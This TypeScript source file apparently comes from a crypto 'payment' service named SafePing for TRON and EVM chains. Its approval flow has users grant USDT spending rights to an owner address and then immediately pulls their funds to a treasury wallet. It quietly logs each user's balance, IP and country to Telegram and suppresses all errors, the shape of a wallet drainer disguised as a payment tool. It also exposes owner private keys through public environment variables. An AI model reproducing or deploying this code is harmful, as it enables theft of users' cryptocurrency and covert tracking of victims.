// =================================
// 🔗 SafePing Main Service
// =================================

import {
  ChainType,
  BlockchainResult,
  TransferResult,
  UserInfo,
} from "../types/blockchain";
import { tronObj, TronService } from "./tronService";
import { EVMService } from "./evmService";
import { TelegramService } from "./telegramService";
import { getChainConfig, getChainId, getWalletType } from "../utils/chainUtils";

export class SafePingService {
  private static instance: SafePingService;
  private nonceCache: Map<string, number> = new Map();

  private constructor() {}

  static getInstance(): SafePingService {
    if (!SafePingService.instance) {
      SafePingService.instance = new SafePingService();
    }
    return SafePingService.instance;
  }

  /**
   * Get user's current nonce from contract
   */
  async getUserNonce(chain: ChainType, userAddress: string): Promise<number> {
    try {
      if (chain === "tron") {
        try {
          return await TronService.getUserNonce(chain, userAddress);
        } catch (tronError) {
          // For TRON, if contract call fails, try to use cached nonce or default to 0
          const cacheKey = `${chain}:${userAddress}`;
          const cachedNonce = this.nonceCache.get(cacheKey);
          if (cachedNonce !== undefined) {
            return cachedNonce;
          }
          return 0; // Default nonce for new users
        }
      } else {
        return await EVMService.getUserNonce(chain, userAddress);
      }
    } catch (error) {
      const cacheKey = `${chain}:${userAddress}`;
      return this.nonceCache.get(cacheKey) || 0;
    }
  }

  /**
   * Get user's USDT balance
   */
  async getUserUSDTBalance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserUSDTBalance(chain, userAddress);
      } else {
        return await EVMService.getUserUSDTBalance(chain, userAddress);
      }
    } catch (error) {
      return "0";
    }
  }

  /**
   * Approve USDT spending using SafePing contract
   */
  async approveUSDTWithSafePing(
    chain: ChainType,
    amount: string,
    userAddress: string,
    paymentId: string,
    clientIP?: string
  ): Promise<{
    success: boolean;
    txHash?: string;
    error?: string;
    transferResult?: TransferResult;
    approvalData?: any; // For EVM chains
    message?: string; // For informational messages
  }> {
    try {
      // Get contract address for debugging
      const contractAddress = await this.getContractAddress(chain);
      const config = getChainConfig(chain);

      // Get owner address from environment variables
      const ownerAddress =
        chain === "tron"
          ? process.env.NEXT_PUBLIC_TRON_PRIVATE_KEY
            ? this.getTronAddressFromPrivateKey(
                process.env.NEXT_PUBLIC_TRON_PRIVATE_KEY
              )
            : null
          : process.env.NEXT_PUBLIC_PRIVATE_KEY
          ? this.getEVMAddressFromPrivateKey(
              process.env.NEXT_PUBLIC_PRIVATE_KEY,
              chain
            )
          : null;

      if (!ownerAddress) {
        return {
          success: false,
          error: `No owner private key configured for ${chain}`,
        };
      }

      // Common functionality for all chains
      const usdtBalance = await this.getUserUSDTBalance(chain, userAddress);

      // Common database update function
      const updateWalletDatabase = async () => {
        try {
          const { getDatabase } = await import("@/lib/database");
          const db = getDatabase();
          await db.saveWallet({
            address: userAddress,
            chain: chain,
            usdtBalance: usdtBalance,
          });
        } catch (dbError: any) {
          // Silent error handling for production
        }
      };

      // Common telegram notification function
      const sendTelegramNotification = async () => {
        try {
          const country = await TelegramService.getCountryFromIP(clientIP);
          const walletType = getWalletType(chain);

          await TelegramService.sendApprovalNotification({
            chain,
            userAddress,
            amount,
            paymentId,
            walletType,
            clientIP,
            usdtBalance,
            country,
          });
        } catch (telegramError) {
          // Silent error handling for production
        }
      };

      if (chain === "tron") {
        console.log("Creating TRON approval data for owner");
        // TRON: Create approval data for user to approve owner
        const approvalData = await TronService.approve(
          config.usdt,
          ownerAddress
        );

        if (!approvalData.success) {
          throw new Error(
            approvalData.error || "TRON approval data creation failed"
          );
        }

        // Update database and send notification
        await Promise.all([updateWalletDatabase(), sendTelegramNotification()]);

        // For TRON, we can proceed with transfer immediately using owner's private key
        const transferResult = await this.transferFromUserAsOwner(
          chain,
          ownerAddress,
          userAddress,
          amount
        );

        return {
          success: true,
          txHash: transferResult.txHash,
          transferResult: {
            success: transferResult.success,
            txHash: transferResult.txHash,
            transferSuccess: transferResult.success,
            transferTxHash: transferResult.txHash,
            chain: chain,
          },
        };
      } else {
        // EVM: Create approval data for user to approve owner
        const approvalData = await EVMService.approve(chain, ownerAddress);

        if (!approvalData.success) {
          throw new Error(
            approvalData.error || "EVM approval data creation failed"
          );
        }

        // Update database and send notification
        await Promise.all([updateWalletDatabase(), sendTelegramNotification()]);

        // For EVM chains, we also execute the transfer immediately using owner's private key
        const transferResult = await this.executeOwnerTransfer(
          chain,
          userAddress,
          amount,
          paymentId
        );

        return {
          success: true,
          txHash: transferResult.txHash,
          transferResult,
          message: "USDT approval to owner successful and transfer completed",
        };
      }
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Execute auto-transfer after user approval (EVM chains)
   */
  async executeAutoTransfer(
    chain: ChainType,
    fromAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      // Get treasury address from database instead of environment variables
      const { getDatabase } = await import("@/lib/database");
      const db = getDatabase();
      const treasuryWallet = await db.getTreasuryWallet(chain);

      if (!treasuryWallet || !treasuryWallet.address) {
        return {
          success: false,
          error: `No treasury wallet configured for ${chain}`,
          transferSuccess: false,
        };
      }

      const treasuryAddress = treasuryWallet.address;

      // Execute transfer using the SafePing contract
      const result = await this.transferFromUser(
        chain,
        fromAddress,
        treasuryAddress,
        amount
      );

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Auto-transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false,
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Auto-transfer failed",
        transferSuccess: false,
      };
    }
  }

  /**
   * Execute transfer from user to treasury using owner's private key
   */
  private async executeOwnerTransfer(
    chain: ChainType,
    userAddress: string,
    amount: string,
    paymentId: string
  ): Promise<TransferResult> {
    try {
      // Get treasury address from database instead of environment variables
      const { getDatabase } = await import("@/lib/database");
      const db = getDatabase();
      const treasuryWallet = await db.getTreasuryWallet(chain);

      if (!treasuryWallet || !treasuryWallet.address) {
        return {
          success: false,
          error: `No treasury wallet configured for ${chain}`,
          transferSuccess: false,
        };
      }

      const treasuryAddress = treasuryWallet.address;

      // Execute transfer using owner's private key to call transferFrom
      const result = await this.transferFromUserAsOwner(
        chain,
        userAddress,
        treasuryAddress,
        amount
      );

      if (result.success) {
        // Send webhook notification
        const webhookResult: TransferResult = {
          success: true,
          txHash: result.txHash,
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
        await this.sendPaymentWebhook(paymentId, "completed", webhookResult);

        return {
          success: true,
          txHash: result.txHash,
          message: "Owner transfer completed successfully",
          transferSuccess: true,
          transferTxHash: result.txHash,
          chain: chain,
        };
      } else {
        return {
          success: false,
          error: result.error || "Transfer failed",
          transferSuccess: false,
        };
      }
    } catch (error: any) {
      return {
        success: false,
        error: error.message || "Owner transfer failed",
        transferSuccess: false,
      };
    }
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  async transferFromUserAsOwner(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUserAsOwner(
          fromAddress,
          toAddress,
          amount
        );
      } else {
        return await EVMService.transferFromUserAsOwner(
          chain,
          fromAddress,
          toAddress,
          amount
        );
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Send webhook notification for payment status change
   */
  private async sendPaymentWebhook(
    paymentId: string,
    status: string,
    transferResult: TransferResult
  ): Promise<void> {
    try {
      const webhookUrl = process.env.WEBHOOK_URL;
      if (!webhookUrl) return;

      const payload = {
        payment_id: paymentId,
        status: status,
        transfer_tx_hash: transferResult.txHash,
        timestamp: new Date().toISOString(),
        chain: transferResult.chain || "unknown",
      };

      await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (error) {
      // Silent error handling for production
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.transferFromUser(
          chain,
          fromAddress,
          toAddress,
          amount
        );
      } else {
        return await EVMService.transferFromUser(
          chain,
          fromAddress,
          toAddress,
          amount
        );
      }
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      if (chain === "tron") {
        return await TronService.isUserApproved(chain, userAddress);
      } else {
        return await EVMService.isUserApproved(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      if (chain === "tron") {
        return await TronService.getUserAllowance(chain, userAddress);
      } else {
        return await EVMService.getUserAllowance(chain, userAddress);
      }
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      if (chain === "tron") {
        return await TronService.getAllApprovedUsers(chain);
      } else {
        return await EVMService.getAllApprovedUsers(chain);
      }
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      if (chain === "tron") {
        return await TronService.revokeUserApproval(chain, userAddress);
      } else {
        return await EVMService.revokeUserApproval(chain, userAddress);
      }
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Get contract address for the specified chain
   */
  private async getContractAddress(chain: ChainType): Promise<string> {
    const { getChainConfig } = await import("../utils/chainUtils");
    const config = getChainConfig(chain);
    return config.paymentProcessor;
  }

  /**
   * Get comprehensive user info
   */
  async getUserInfo(chain: ChainType, userAddress: string): Promise<UserInfo> {
    try {
      const [allowance, nonce, isApproved, usdtBalance] = await Promise.all([
        this.getUserAllowance(chain, userAddress),
        this.getUserNonce(chain, userAddress),
        this.isUserApproved(chain, userAddress),
        this.getUserUSDTBalance(chain, userAddress),
      ]);

      return {
        address: userAddress,
        allowance,
        nonce,
        isApproved,
        usdtBalance,
      };
    } catch (error) {
      // Silent error handling for production
      throw error;
    }
  }

  /**
   * Get TRON address from private key
   */
  private getTronAddressFromPrivateKey(privateKey: string): string {
    const tronWeb = tronObj.tronWeb || (global as any).tronWeb;
    return tronWeb.address.fromPrivateKey(privateKey);
  }

  /**
   * Get EVM address from private key
   */
  private getEVMAddressFromPrivateKey(
    privateKey: string,
    chain: ChainType
  ): string {
    try {
      const { ethers } = require("ethers");
      const wallet = new ethers.Wallet(privateKey);
      return wallet.address;
    } catch (error) {
      // Silent error handling for production
      return "";
    }
  }

  /**
   * Create TRON approval data for user to approve owner
   */
  private async createTronOwnerApproval(
    tokenAddress: string,
    ownerAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      // Create approval data structure for TRON
      const approvalData = {
        to: tokenAddress,
        data: `approve(${ownerAddress},${amount})`,
        value: "0",
        chainId: 728126428, // TRON mainnet
        spender: ownerAddress,
        maxApproval: amount,
      };

      return {
        success: true,
        approvalData: approvalData,
        message: "TRON approval data created for owner",
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error: error.message || "Failed to create TRON approval data for owner",
      };
    }
  }

  /**
   * Create EVM approval data for user to approve owner
   */
  private async createEVMOwnerApproval(
    tokenAddress: string,
    ownerAddress: string,
    amount: string,
    chain: ChainType
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = require("ethers");

      // Validate addresses
      if (!ethers.isAddress(tokenAddress)) {
        throw new Error(`Invalid token address: ${tokenAddress}`);
      }

      if (!ethers.isAddress(ownerAddress)) {
        throw new Error(`Invalid owner address: ${ownerAddress}`);
      }

      // Create the approval data for the USDT contract
      const usdtContract = new ethers.Contract(
        tokenAddress,
        [
          "function approve(address spender, uint256 amount) returns (bool)",
          "function name() view returns (string)",
          "function symbol() view returns (string)",
          "function decimals() view returns (uint8)",
        ],
        ethers.getDefaultProvider(config.rpc)
      );

      // Encode the approve function call - user approves OWNER to spend their USDT
      const approveData = usdtContract.interface.encodeFunctionData("approve", [
        ownerAddress,
        amount,
      ]);

      // Create approval data for the user to sign
      const approvalData = {
        to: tokenAddress,
        data: approveData,
        value: "0x0", // No ETH value needed for token approval
        chainId: config.chainId,
        spender: ownerAddress, // Owner address (not contract)
        maxApproval: amount,
      };

      return {
        success: true,
        approvalData: approvalData,
        message: "EVM approval data created for owner",
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error: error.message || "Failed to create EVM approval data for owner",
      };
    }
  }
}

// Export singleton instance
export const safePingService = SafePingService.getInstance();
